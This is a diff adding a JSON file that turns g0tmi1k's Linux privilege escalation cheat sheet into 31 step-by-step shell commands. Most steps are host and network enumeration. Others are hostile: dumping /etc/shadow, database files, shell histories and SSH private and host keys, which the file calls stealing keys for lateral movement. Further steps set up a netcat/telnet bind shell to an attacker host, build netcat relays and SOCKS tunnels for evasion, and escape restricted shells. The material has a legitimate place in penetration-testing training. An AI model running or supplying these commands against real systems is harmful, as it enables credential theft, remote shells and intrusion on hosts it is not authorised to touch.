@@ -1,0 +1,209 @@
+{
+	"name": "Complete Linux Privilege Escalation Vectors (Full g0tmi1k Cheat Sheet)",
+	"description": "A comprehensive guide to Linux privilege escalation, covering all enumeration techniques, commands, and vectors from g0tmi1k's 2011 cheat sheet. Includes OS details, services, networking, users, file systems, and more. Enumeration is key—collect data, analyze, search exploits, adapt, and test.",
+	"tools": [
+		{
+			"name": "LinPEAS",
+			"description": "Automated enumeration script for modern Linux privesc checks",
+			"url": "https://github.com/carlospolop/PEASS-ng/releases/latest"
+		},
+		{
+			"name": "Unix-privesc-check",
+			"description": "Classic automated Unix/Linux privesc scanner",
+			"url": "https://pentestmonkey.net/tools/unix-privesc-check"
+		},
+		{
+			"name": "Searchsploit",
+			"description": "Local exploit database search tool",
+			"url": "https://github.com/offensive-security/exploitdb"
+		}
+	],
+	"steps": [
+		{
+			"index": 1,
+			"name": "OS Distribution and Version Enumeration",
+			"command": "cat /etc/issue; cat /etc/*-release; cat /etc/lsb-release 2>/dev/null; cat /etc/redhat-release 2>/dev/null",
+			"description": "Identify distro type and version to research known vulnerabilities (e.g., Debian vs. RedHat)."
+		},
+		{
+			"index": 2,
+			"name": "Kernel Version and Architecture Check",
+			"command": "cat /proc/version; uname -a; uname -mrs; rpm -q kernel 2>/dev/null; dmesg | grep Linux; ls /boot | grep vmlinuz-",
+			"description": "Gather kernel details (version, 64-bit?) for kernel exploit searches on exploit-db.com or cve.mitre.org."
+		},
+		{
+			"index": 3,
+			"name": "Environment Variables and Profiles",
+			"command": "cat /etc/profile; cat /etc/bashrc; cat ~/.bash_profile; cat ~/.bashrc; cat ~/.bash_logout; env; set",
+			"description": "Inspect profiles and env vars for PATH hijacks or credential leaks."
+		},
+		{
+			"index": 4,
+			"name": "Printer Services",
+			"command": "lpstat -a 2>/dev/null",
+			"description": "Check for CUPS or LPD printers that might expose misconfigs."
+		},
+		{
+			"index": 5,
+			"name": "Running Processes and Services",
+			"command": "ps aux; ps -ef; top; cat /etc/services",
+			"description": "List all processes; focus on root-owned ones for vulnerable services."
+		},
+		{
+			"index": 6,
+			"name": "Root-Owned Services",
+			"command": "ps aux | grep root; ps -ef | grep root",
+			"description": "Double-check root services for known CVEs or weak configs."
+		},
+		{
+			"index": 7,
+			"name": "Installed Applications and Versions",
+			"command": "ls -alh /usr/bin/; ls -alh /sbin/; dpkg -l 2>/dev/null; rpm -qa 2>/dev/null; ls -alh /var/cache/apt/archives/ 2>/dev/null; ls -alh /var/cache/yum/ 2>/dev/null",
+			"description": "Catalog binaries and packages; search for vulnerable versions."
+		},
+		{
+			"index": 8,
+			"name": "Service Configuration Files",
+			"command": "cat /etc/syslog.conf 2>/dev/null; cat /etc/httpd.conf 2>/dev/null; cat /etc/lighttpd.conf 2>/dev/null; cat /etc/cups/cupsd.conf 2>/dev/null; cat /etc/inetd.conf 2>/dev/null; cat /etc/apache2/apache2.conf 2>/dev/null; cat /etc/my.cnf 2>/dev/null; cat /opt/lampp/etc/httpd.conf 2>/dev/null; ls -aRl /etc/ | awk '$1 ~ /^.*r.*/'",
+			"description": "Look for misconfigs, vulnerable plugins, or hardcoded creds in service configs."
+		},
+		{
+			"index": 9,
+			"name": "Scheduled Jobs and Crontabs",
+			"command": "crontab -l 2>/dev/null; ls -alh /var/spool/cron/; ls -al /etc/ | grep cron; ls -al /etc/cron*; cat /etc/cron*; cat /etc/at.allow 2>/dev/null; cat /etc/at.deny 2>/dev/null; cat /etc/cron.allow 2>/dev/null; cat /etc/cron.deny 2>/dev/null; cat /etc/crontab; cat /etc/anacrontab; cat /var/spool/cron/crontabs/root 2>/dev/null",
+			"description": "Hunt for root cron jobs with writable scripts for hijacking."
+		},
+		{
+			"index": 10,
+			"name": "Plain Text Credentials Search",
+			"command": "grep -i user [filename]; grep -i pass [filename]; grep -C 5 \"password\" [filename]; find . -name \"*.php\" -print0 | xargs -0 grep -i -n \"var $password\" 2>/dev/null",
+			"description": "Scan files for usernames/passwords; target Joomla-style vars."
+		},
+		{
+			"index": 11,
+			"name": "Network Interfaces",
+			"command": "/sbin/ifconfig -a 2>/dev/null; cat /etc/network/interfaces 2>/dev/null; cat /etc/sysconfig/network 2>/dev/null",
+			"description": "Identify NICs and connections for pivoting."
+		},
+		{
+			"index": 12,
+			"name": "Network Configuration (DNS, Gateway, etc.)",
+			"command": "cat /etc/resolv.conf; cat /etc/sysconfig/network 2>/dev/null; cat /etc/networks 2>/dev/null; iptables -L; hostname; dnsdomainname",
+			"description": "Map DNS, DHCP, gateway for internal recon."
+		},
+		{
+			"index": 13,
+			"name": "Active Connections and Services",
+			"command": "lsof -i; lsof -i :80 2>/dev/null; grep 80 /etc/services 2>/dev/null; netstat -antup 2>/dev/null; netstat -antpx 2>/dev/null; netstat -tulpn 2>/dev/null; chkconfig --list 2>/dev/null; chkconfig --list | grep 3:on 2>/dev/null; last; w",
+			"description": "Spot listening ports, connections; check runlevels."
+		},
+		{
+			"index": 14,
+			"name": "ARP Cache and Routing",
+			"command": "arp -e; route 2>/dev/null; /sbin/route -nee 2>/dev/null",
+			"description": "Enumerate local network hosts via ARP/MAC."
+		},
+		{
+			"index": 15,
+			"name": "Packet Sniffing with tcpdump",
+			"command": "tcpdump tcp dst 192.168.1.7 80 and tcp dst 10.5.5.252 21 2>/dev/null",
+			"description": "Capture live traffic; adapt IPs/ports for recon."
+		},
+		{
+			"index": 16,
+			"name": "Bind Shell Setup",
+			"command": "nc -lvp 4444  # Attacker: Input; nc -lvp 4445  # Attacker: Output; telnet [attacker_ip] 4444 | /bin/sh | nc [local_ip] 4445  # Target: Bridge shell",
+			"description": "Establish interactive shell using netcat/telnet."
+		},
+		{
+			"index": 17,
+			"name": "Port Forwarding with rinetd/FPipe/SSH",
+			"command": "FPipe -l 80 -r 80 -s 80 192.168.1.7; ssh -L 8080:127.0.0.1:80 root@192.168.1.7; ssh -R 8080:127.0.0.1:80 root@192.168.1.7; mknod backpipe p; nc -l -p 8080 < backpipe | nc 10.5.5.151 80 > backpipe",
+			"description": "Redirect traffic; use rinetd for simple forwarding or SSH for secure."
+		},
+		{
+			"index": 18,
+			"name": "Proxy Tunneling with Proxychains",
+			"command": "ssh -D 127.0.0.1:9050 -N [user]@[ip]; proxychains ifconfig",
+			"description": "Tunnel traffic via SOCKS proxy for evasion."
+		},
+		{
+			"index": 19,
+			"name": "Current User and Login History",
+			"command": "id; who; w; last; cat /etc/passwd | cut -d: -f1; grep -v -E \"^#\" /etc/passwd | awk -F: '$3 == 0 { print $1}'; awk -F: '($3 == \"0\") {print}' /etc/passwd; cat /etc/sudoers 2>/dev/null; sudo -l 2>/dev/null",
+			"description": "List users, superusers, sudo rights, and recent logins."
+		},
+		{
+			"index": 20,
+			"name": "Sensitive Files (/etc/passwd, etc.)",
+			"command": "cat /etc/passwd; cat /etc/group; cat /etc/shadow 2>/dev/null; ls -alh /var/mail/",
+			"description": "Check for readable shadow file or mail spools."
+		},
+		{
+			"index": 21,
+			"name": "Home Directory Enumeration",
+			"command": "ls -ahlR /root/ 2>/dev/null; ls -ahlR /home/",
+			"description": "Inspect user homes for configs or keys (if accessible)."
+		},
+		{
+			"index": 22,
+			"name": "Plain Text Passwords in Configs",
+			"command": "cat /var/apache2/config.inc 2>/dev/null; cat /var/lib/mysql/mysql/user.MYD 2>/dev/null; cat /root/anaconda-ks.cfg 2>/dev/null",
+			"description": "Target common password locations in apps/DBs."
+		},
+		{
+			"index": 23,
+			"name": "User History Files",
+			"command": "cat ~/.bash_history; cat ~/.nano_history 2>/dev/null; cat ~/.atftp_history 2>/dev/null; cat ~/.mysql_history 2>/dev/null; cat ~/.php_history 2>/dev/null",
+			"description": "Extract commands/history for creds or paths."
+		},
+		{
+			"index": 24,
+			"name": "User Profile and Mail",
+			"command": "cat ~/.bashrc; cat ~/.profile; cat /var/mail/root 2>/dev/null; cat /var/spool/mail/root 2>/dev/null",
+			"description": "Check profiles and root mail for secrets."
+		},
+		{
+			"index": 25,
+			"name": "SSH Keys and Configs",
+			"command": "cat ~/.ssh/authorized_keys 2>/dev/null; cat ~/.ssh/identity.pub 2>/dev/null; cat ~/.ssh/identity 2>/dev/null; cat ~/.ssh/id_rsa.pub 2>/dev/null; cat ~/.ssh/id_rsa 2>/dev/null; cat ~/.ssh/id_dsa.pub 2>/dev/null; cat ~/.ssh/id_dsa 2>/dev/null; cat /etc/ssh/ssh_config 2>/dev/null; cat /etc/ssh/sshd_config 2>/dev/null; cat /etc/ssh/ssh_host_dsa_key.pub 2>/dev/null; cat /etc/ssh/ssh_host_dsa_key 2>/dev/null; cat /etc/ssh/ssh_host_rsa_key.pub 2>/dev/null; cat /etc/ssh/ssh_host_rsa_key 2>/dev/null; cat /etc/ssh/ssh_host_key.pub 2>/dev/null; cat /etc/ssh/ssh_host_key 2>/dev/null",
+			"description": "Steal or inspect SSH keys for lateral movement."
+		},
+		{
+			"index": 26,
+			"name": "Writable /etc/ Files",
+			"command": "ls -aRl /etc/ | awk '$1 ~ /^.*w.*/' 2>/dev/null; ls -aRl /etc/ | awk '$1 ~ /^..w/' 2>/dev/null; ls -aRl /etc/ | awk '$1 ~ /^.....w/' 2>/dev/null; ls -aRl /etc/ | awk '$1 ~ /w.$/' 2>/dev/null; find /etc/ -readable -type f 2>/dev/null; find /etc/ -readable -type f -maxdepth 1 2>/dev/null",
+			"description": "Find writable configs for service hijacks (anyone/owner/group/other)."
+		},
+		{
+			"index": 27,
+			"name": "/var/ Directory Inspection",
+			"command": "ls -alh /var/log/; ls -alh /var/mail/; ls -alh /var/spool/; ls -alh /var/spool/lpd/ 2>/dev/null; ls -alh /var/lib/pgsql/ 2>/dev/null; ls -alh /var/lib/mysql/; cat /var/lib/dhcp3/dhclient.leases 2>/dev/null",
+			"description": "Check logs, mail, spools, DBs for leaks."
+		},
+		{
+			"index": 28,
+			"name": "Web Root Directories",
+			"command": "ls -alhR /var/www/; ls -alhR /srv/www/htdocs/ 2>/dev/null; ls -alhR /usr/local/www/apache22/data/ 2>/dev/null; ls -alhR /opt/lampp/htdocs/ 2>/dev/null; ls -alhR /var/www/html/ 2>/dev/null",
+			"description": "Hunt for web app configs, backups, or LFI-vulnerable files."
+		},
+		{
+			"index": 29,
+			"name": "Log Files Enumeration",
+			"command": "cat /etc/httpd/logs/access_log 2>/dev/null; cat /etc/httpd/logs/access.log 2>/dev/null; cat /etc/httpd/logs/error_log 2>/dev/null; cat /etc/httpd/logs/error.log 2>/dev/null; cat /var/log/apache2/access_log 2>/dev/null; cat /var/log/apache2/access.log 2>/dev/null; cat /var/log/apache2/error_log 2>/dev/null; cat /var/log/apache2/error.log 2>/dev/null; cat /var/log/apache/access_log 2>/dev/null; cat /var/log/apache/access.log 2>/dev/null; cat /var/log/auth.log 2>/dev/null; cat /var/log/chttp.log 2>/dev/null; cat /var/log/cups/error_log 2>/dev/null; cat /var/log/dpkg.log 2>/dev/null; cat /var/log/faillog 2>/dev/null; cat /var/log/httpd/access_log 2>/dev/null; cat /var/log/httpd/access.log 2>/dev/null; cat /var/log/httpd/error_log 2>/dev/null; cat /var/log/httpd/error.log 2>/dev/null; cat /var/log/lighttpd/access.log 2>/dev/null; cat /var/log/lighttpd/error.log 2>/dev/null; cat /var/log/lighttpd/lighttpd.access.log 2>/dev/null; cat /var/log/lighttpd/lighttpd.error.log 2>/dev/null; cat /var/log/messages 2>/dev/null; cat /var/log/secure 2>/dev/null; cat /var/log/syslog 2>/dev/null; cat /var/log/wtmp 2>/dev/null; cat /var/log/xferlog 2>/dev/null; cat /var/log/yum.log 2>/dev/null; cat /var/run/utmp 2>/dev/null; cat /var/webmin/miniserv.log 2>/dev/null; cat /var/www/logs/access_log 2>/dev/null; cat /var/www/logs/access.log 2>/dev/null; ls -alh /var/lib/dhcp3/ 2>/dev/null; ls -alh /var/log/postgresql/ 2>/dev/null; ls -alh /var/log/proftpd/ 2>/dev/null; ls -alh /var/log/samba/ 2>/dev/null",
+			"description": "Scan all common logs for creds, errors, or LFI paths (auth.log, syslog, etc.)."
+		},
+		{
+			"index": 30,
+			"name": "Jailbreak Limited Shell",
+			"command": "python -c 'import pty; pty.spawn(\"/bin/bash\")'; echo os.system('/bin/bash'); /bin/sh -i",
+			"description": "Escape restricted shells for full interaction."
+		},
+		{
+			"index": 31,
+			"name": "Mounted File Systems",
+			"command": "mount; df -h; cat /etc/fstab",
+			"description": "Check mounts for noexec/nosuid or unmounted shares."
+		}
+	]
+}
